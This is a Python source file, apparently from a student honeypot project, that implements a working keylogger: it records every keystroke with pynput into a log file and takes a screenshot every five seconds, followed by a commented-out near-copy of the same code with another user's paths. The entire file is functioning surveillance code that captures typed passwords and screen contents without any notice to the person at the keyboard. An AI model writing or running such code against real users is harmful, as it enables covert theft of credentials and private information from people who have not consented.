#Import all these Libraries
from mss import mss                     #To take screenshots
from pynput.keyboard import Listener    #To keep record of pressed Keys
from threading import Timer,Thread      #To run thing in parallel(screenshots and keylogs)
import time                             #To record time of Screenshots
import os                               #To make the System to intract with the Operating System

count=0
keys=[]                                 #List which all the pressed keys


                                        
class IntervalTimer(Timer):             #Control the Time interval between each Screenshots
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)
            
            
def write_file(keys):                  #To write the keys to the Files
    with open("C:/Users/ADMIN/OneDrive/Desktop/data_stored/honey_ss/log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:      #Replace Key_Space with " " in the main file
                f.write(" ")
            if k.find("enter")>0:      #Replace Key_Enter with "\n or nextline"
                f.write("\n")
            elif k.find("Key") == -1:   
                f.write(k)
                  

class keylogger_main:
    
    def _build_logs(self):             #To create the directory which contains all the screenshots and log files 
        if not os.path.exists("C:/Users/ADMIN/OneDrive/Desktop/data_stored/honey_ss"):
            os.mkdir("C:/Users/ADMIN/OneDrive/Desktop/data_stored/honey_ss")
            os.mkdir("C:/Users/ADMIN/OneDrive/Desktop/data_stored/honey_ss/Screenshots")
        if not os.path.exists("C:/Users/ADMIN/OneDrive/Desktop/data_stored/honey_ss/log.txt"):
            with open("C:/Users/ADMIN/OneDrive/Desktop/data_stored/honey_ss/log.txt", 'w'):  # Open in write mode to create the file
                pass  # Just create the file without writing anything
    
    def _on_press(self,k):             #This Function keeps track of pressed keys
        global keys, count
        #print("{0} pressed".format(k))
        keys.append(k)
        count+=1
    
        if count >=10:
            count=0
            write_file(keys)
            keys=[]   
    
    def _keylogger(self):            #Main Funciton to start the key tracker
        with Listener(on_press=self._on_press) as listener:
            listener.join()
            
    def _Screenshot(self):           #Main Function to start thr Screenshot tracker
        sct=mss()
        sct.shot(output='C:/Users/ADMIN/Downloads/Honeypot/Honeypot-Implementation-master/data_stored/honey_ss/Screenshots/{}.png'.format(time.time()))
    
    def run(self,interval):        #Main fucntion to start the keylogger
        
        self._build_logs()
        Thread(target=self._keylogger).start()   #This thread function is used to Run the Keys and Screenshots tracker parallely
        IntervalTimer(interval, self._Screenshot).start()
        
        
km=keylogger_main() 
#interval=int(input("Enter the time interval between each Screenshot:"))
km.run(5)





# SREEEEEEEJAAAAAAAAS CODE

# # Import all these Libraries
# from mss import mss                     # To take screenshots
# from pynput.keyboard import Listener    # To keep record of pressed Keys
# from threading import Timer, Thread     # To run things in parallel (screenshots and keylogs)
# import time                             # To record time of Screenshots
# import os                               # To make the System interact with the Operating System

# count = 0
# keys = []                               # List which all the pressed keys

# class IntervalTimer(Timer):             # Control the Time interval between each Screenshot
#     def run(self):
#         while not self.finished.wait(self.interval):
#             self.function(*self.args, **self.kwargs)

# def write_file(keys):                   # To write the keys to the Files
#     with open("C:/Users/SREEJA REDDY/OneDrive/Pictures/Documents/Honeypot-Implementation-master/Honeypot-Implementation-master/Keylogger/log.txt", "a") as f:
#         for key in keys:
#             k = str(key).replace("'", "")
#             if k.find("space") > 0:    # Replace Key_Space with " " in the main file
#                 f.write(" ")
#             if k.find("enter") > 0:    # Replace Key_Enter with "\n or nextline"
#                 f.write("\n")
#             elif k.find("Key") == -1:
#                 f.write(k)

# class keylogger_main:

#     def _build_logs(self):  # To create the directory which contains all the screenshots and log files
#         keylogger_path = 'C:/Users/SREEJA REDDY/OneDrive/Pictures/Documents/Honeypot-Implementation-master/Honeypot-Implementation-master/Keylogger'
#         screenshots_path = os.path.join(keylogger_path, 'Screenshots')

#         if not os.path.exists(keylogger_path):
#             os.mkdir(keylogger_path)

#         if not os.path.exists(screenshots_path):
#             os.mkdir(screenshots_path)

#     def _on_press(self, k):  # This Function keeps track of pressed keys
#         global keys, count
#         keys.append(k)
#         count += 1

#         if count >= 10:
#             count = 0
#             write_file(keys)
#             keys = []

#     def _keylogger(self):  # Main Function to start the key tracker
#         with Listener(on_press=self._on_press) as listener:
#             listener.join()

#     def _Screenshot(self):  # Main Function to start the Screenshot tracker
#         sct = mss()
#         sct.shot(output='C:/Users/SREEJA REDDY/OneDrive/Pictures/Documents/Honeypot-Implementation-master/Honeypot-Implementation-master/Keylogger/Screenshots/{}.png'.format(time.time()))

#     def run(self, interval):  # Main function to start the keylogger
#         self._build_logs()
#         Thread(target=self._keylogger).start()  # This thread function is used to Run the Keys and Screenshots tracker parallely
#         IntervalTimer(interval, self._Screenshot).start()

# km = keylogger_main()
# # interval = int(input("Enter the time interval between each Screenshot:"))
# km.run(5)